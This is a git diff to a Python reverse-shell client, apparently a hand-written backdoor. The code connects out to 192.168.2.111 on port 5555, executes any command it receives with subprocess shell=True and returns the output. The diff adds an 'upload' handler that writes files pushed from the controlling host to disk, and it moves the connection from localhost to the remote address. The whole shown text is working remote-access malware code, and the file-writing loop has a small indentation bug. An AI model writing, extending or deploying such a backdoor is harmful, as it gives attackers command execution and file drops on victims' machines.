@@ -15,6 +15,18 @@ def reliable_recv():
             return json.loads(data)
         except ValueError:
             continue
+def download_file(file_name):
+    f = open(file_name, 'wb')
+    s.settimeout(1)
+    chunk = s.recv(1024)
+    while chunk:
+        f.write(chunk)
+        try:
+            chunk = s.recv(1024)
+        except socket.timeout as e:
+            break
+        s.settimeout(None)
+        f.close()
 
 def shell():
     while True:
@@ -27,6 +39,8 @@ def shell():
             pass
         elif command[:3] == 'cd ':
             os.chdir(command[3:])
+        elif command[:6] == 'upload':
+            download_file(command[7:])
         else:
             execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                        stdin=subprocess.PIPE)
@@ -35,5 +49,5 @@ def shell():
             reliable_send(result)
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.connect(('127.0.0.1', 5555))
+s.connect(('192.168.2.111', 5555))
 shell()
